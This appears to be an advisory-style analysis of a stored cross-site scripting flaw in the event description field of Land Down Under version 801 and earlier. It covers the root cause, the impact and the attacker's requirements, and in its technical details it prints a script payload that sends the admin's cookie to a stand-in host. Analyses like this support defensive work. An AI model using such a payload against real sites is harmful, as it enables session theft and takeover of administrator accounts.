Based on the provided information, here's an analysis of the vulnerability:

**Root Cause of Vulnerability:**
The vulnerability is due to the lack of proper input sanitization in the "Description" field when submitting an event through `events.php?m=add` in Land Down Under (LDU).

**Weaknesses/Vulnerabilities Present:**
- **Cross-Site Scripting (XSS):** The primary vulnerability is an XSS vulnerability. The application fails to properly sanitize user-supplied input in the "Description" field, allowing the injection of arbitrary HTML and JavaScript code.

**Impact of Exploitation:**
- **Cookie Stealing:** The most immediate impact mentioned is the ability to steal an administrator's cookie. By injecting malicious JavaScript, an attacker can redirect the admin to a malicious site and exfiltrate their session cookies, potentially gaining administrative access to the LDU system.
- **Arbitrary Code Execution in Admin Context:** This has further implications such as potential modification of the application, deletion or extraction of data.

**Attack Vectors:**
- The attack vector is the "Description" field of an event submission form in the LDU application. A logged-in user can insert malicious JavaScript code into the description.

**Required Attacker Capabilities/Position:**
- **User Account:** The attacker needs a valid user account on the LDU system, which is required to access the event submission form.
- **Admin Interaction:** The injected JavaScript payload is executed in the admin's browser when they review and approve the event.

**Technical Details:**
The provided exploit code is:

```html
<script>document.location="http://example.com/script?cookie="+escape(document.cookie)</script>
```

This script, when executed in the admin's browser, redirects their browser to `http://example.com/script?cookie=` and appends their cookie data. This allows an attacker to steal the user's session information.

**Affected Versions:**
LDU version 801 and earlier are vulnerable.
